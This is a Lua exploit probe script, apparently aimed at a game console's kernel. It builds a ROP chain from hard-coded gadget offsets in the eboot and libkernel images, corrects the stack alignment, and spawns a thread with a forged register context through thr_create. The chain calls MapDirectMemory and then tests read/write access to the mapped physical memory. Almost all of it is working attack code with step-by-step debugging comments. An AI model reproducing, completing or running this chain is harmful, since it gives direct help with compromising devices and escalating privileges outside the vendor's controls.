-- CRASH_CLASS: HIGH
-- PROBE 532b: MapDirectMemory with stack alignment fix
--
-- Bug found: at map_fn entry, RSP % 16 == 0, but SysV ABI requires
-- RSP % 16 == 8 at function entry (because 'call' pushes 8-byte ret addr).
-- Functions using movaps/SSE will crash on misaligned RSP.
--
-- Fix: insert a bare 'ret' gadget before map_fn to consume one 8-byte slot,
-- shifting RSP by 8 and achieving correct alignment.
--
-- Chain layout (entries before map_fn):
--   ... 18 entries (sysarch + store + MapDM reg setup) ...
--   [bare_ret]              ← ret pops next entry (map_fn) into RIP
--   [map_fn]                ← now a "value" popped by bare_ret
--   [pop_rdi_ret]           ← return addr from map_fn (eats name slot)
--   [0 = name]              ← 7th arg, popped into RDI by pop_rdi_ret
--   ... continuation ...
--
-- Wait, that changes the mechanic. Let me think again.
--
-- Current (broken alignment):
--   [pop_rcx_ret] [0] [map_fn] [ret_addr] [name] ...
--   pop_rcx pops 0 → ret pops map_fn → jumps to map_fn
--   RSP at map_fn entry = &ret_addr = chain + 18*8 = chain + 144
--   144 % 16 == 0. WRONG (needs 8).
--
-- Fix: add an alignment ret gadget:
--   [pop_rcx_ret] [0] [bare_ret] [map_fn] [ret_addr] [name] ...
--   pop_rcx pops 0 → ret pops bare_ret → jumps to bare_ret
--   bare_ret pops map_fn → jumps to map_fn
--   RSP at map_fn entry = &ret_addr = chain + 20*8 = chain + 152
--   152 % 16 == 8. CORRECT!

print("=== PROBE 532b: MAPDM ALIGNED ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_thr_kill = make_syscall(433)
local syscall_ret = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi or 0, lk_lo or 0))
print("lk=" .. q(lk))

local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)
local pop_rdx_ret = eboot + uint64(0x3B02D7)
local pop_rcx_ret = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self = eboot + uint64(0x15481)
local bare_ret = eboot + uint64(0x42)
local alloc_fn = lk + uint64(0x17EF0)
local map_fn = lk + uint64(0x15020)

-- Verify bare_ret gadget
local br_b = rd(to_num(eboot) + 0x42)
if br_b then
    local brn = br_b; if brn < 0 then brn = brn + 0x100000000 end
    local lo_byte = brn % 256
    print(string.format("bare_ret(+0x42)=0x%02X %s", lo_byte, lo_byte == 0xC3 and "OK" or "BAD"))
    if lo_byte ~= 0xC3 then print("ABORT: bare_ret not C3") return end
end

-- [A] AllocateDirectMemory
print("[A] Alloc phys")
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))
if not phys or to_num(phys) == 0 then print("FAIL: no phys") return end

-- [B] Setup
print("[B] Setup")
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x4000)
wq(shared + 0x00, uint64(0))        -- VA output
wq(shared + 0x08, uint64(0xAAAA))   -- sysarch rv
wq(shared + 0x10, uint64(0xBBBB))   -- MapDM rv
wq(shared + 0x18, uint64(0xCCCC))   -- done marker

local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, tcb_page)

print("  shared=" .. q(shared))

-- [C] Build ROP chain
print("[C] Chain")
local chain = stack_base + 0x200000 - 0x800
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- Phase 1: sysarch(165, SET_FSBASE=129, &tcb)
-- Entry: RIP = pop_rax_ret, RSP = chain
-- pop_rax pops [0] → rax = 165
emit(uint64(165))           -- [0] rax value
emit(pop_rdi_ret)            -- [8]
emit(uint64(129))            -- [16]
emit(pop_rsi_ret)            -- [24]
emit(tcb_ptr)                -- [32]
emit(syscall_ret)            -- [40]

-- Store sysarch rv → shared[0x08]
emit(pop_rdi_ret)            -- [48]
emit(shared + 0x08)          -- [56]
emit(mov_rdi_rax_ret)        -- [64]

-- Phase 2: set up MapDirectMemory register args
emit(pop_rdi_ret)            -- [72]
emit(shared + 0x00)          -- [80]  rdi = &VA_output
emit(pop_rsi_ret)            -- [88]
emit(uint64(0x4000))         -- [96]  rsi = 16KB
emit(pop_rdx_ret)            -- [104]
emit(uint64(3))              -- [112] rdx = PROT_READ|PROT_WRITE
emit(pop_rcx_ret)            -- [120]
emit(uint64(0))              -- [128] rcx = flags = 0

-- ALIGNMENT FIX: insert bare_ret to shift RSP by 8
-- After pop_rcx_ret does ret: RSP = chain+136
-- bare_ret pops map_fn → RSP = chain+144
-- At map_fn entry: RSP = chain+152
-- chain+152: 152 = 9*16 + 8, so RSP % 16 == 8. CORRECT!
emit(bare_ret)               -- [136] alignment gadget
emit(map_fn)                 -- [144] popped by bare_ret → jumps to map_fn

-- Stack frame at map_fn entry (RSP = chain+152):
-- [RSP+0] = return addr (pop_rdi_ret, eats name)
-- [RSP+8] = name (7th arg = NULL)
emit(pop_rdi_ret)            -- [152] return addr
emit(uint64(0))              -- [160] name = NULL (7th arg)

-- After map_fn rets:
-- pop_rdi_ret pops name(0) → RDI=0 (harmless)
-- ret pops next → continuation

-- Post-call: store MapDM rv (rax)
emit(pop_rdi_ret)            -- [168]
emit(shared + 0x10)          -- [176]
emit(mov_rdi_rax_ret)        -- [184]

-- Done marker
emit(pop_rdi_ret)            -- [192]
emit(shared + 0x18)          -- [200]
emit(pop_rax_ret)            -- [208]
emit(uint64(0x444F4E45))     -- [216] "DONE"
emit(mov_rdi_rax_ret)        -- [224]

-- thr_exit(0)
emit(pop_rax_ret)            -- [232]
emit(uint64(431))            -- [240]
emit(pop_rdi_ret)            -- [248]
emit(uint64(0))              -- [256]
emit(syscall_ret)            -- [264]

print(string.format("  chain=%d bytes (%d entries)", i, i/8))

-- Verify alignment math
print(string.format("  map_fn at chain+144, RSP at entry=chain+152"))
print(string.format("  152 mod 16 = %d (need 8)", 152 % 16))

-- [D] Context
print("[D] Context")
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret)     -- RIP
wq(ctx + 0x0F8, chain)            -- RSP
-- r8 = phys offset, r9 = alignment (for MapDirectMemory)
wq(ctx + 0x068, phys)             -- r8
wq(ctx + 0x070, uint64(0x4000))   -- r9

print("  r8(phys)=" .. q(phys))

-- [E] Spawn
print("[E] thr_create")
local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(rq(tid_buf)))

if to_num(rv_tc) ~= 0 then
    print("  CONTEXT REJECTED")
    print("=== 532b DONE ===")
    return
end

-- [F] Wait for done marker
print("[F] Wait")
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 100000000)  -- 100ms
local done = false
for attempt = 1, 30 do
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local m = rq(shared + 0x18)
    if m then
        local mn = to_num(m)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn ~= 0 and mn ~= 0xCCCC then
            done = true
            break
        end
    end
end

-- [G] Results
print("[G] Results")
print("  sysarch=" .. q(rq(shared + 0x08)))
print("  map_rv=" .. q(rq(shared + 0x10)))
print("  va=" .. q(rq(shared + 0x00)))
print("  done=" .. q(rq(shared + 0x18)) .. " (" .. tostring(done) .. ")")

local va_out = rq(shared + 0x00)
local map_rv = rq(shared + 0x10)
local map_rv_n = to_num(map_rv)
if map_rv_n < 0 then map_rv_n = map_rv_n + 0x100000000 end

if done and va_out and to_num(va_out) ~= 0 then
    print("")
    print("[H] *** MAPPED PHYSICAL MEMORY ***")
    -- Try R/W
    local va_n = to_num(va_out)
    local ok_w = pcall(function() memory.write_dword(va_out, 0xCAFEBABE) end)
    local rb_val = rd(va_n)
    if rb_val then
        if rb_val < 0 then rb_val = rb_val + 0x100000000 end
        print(string.format("  write 0xCAFEBABE -> read 0x%08X", rb_val))
        if rb_val == 0xCAFEBABE then
            print("  *** PHYSICAL MEMORY R/W CONFIRMED ***")
        end
    else
        print("  READ FAULT at VA " .. q(va_out))
    end
elseif done and map_rv_n ~= 0 and map_rv_n ~= 0xBBBB then
    print("  MapDM returned error: " .. q(map_rv))
    print("  (function ran but rejected our args)")
else
    print("  Child did not complete")
    local ok_k, rv_k = pcall(function() return sc_thr_kill(rq(tid_buf), uint64(0)) end)
    print("  thr_kill=" .. tostring(to_num(rv_k)))

    local sa = rq(shared + 0x08)
    local san = to_num(sa); if san < 0 then san = san + 0x100000000 end
    if san == 0 then
        print("  sysarch OK → crash is INSIDE MapDirectMemory")
    elseif san == 0xAAAA then
        print("  sysarch never wrote → crash BEFORE sysarch")
    else
        print("  sysarch returned: " .. q(sa))
    end
end

print("")
print("=== 532b DONE ===")
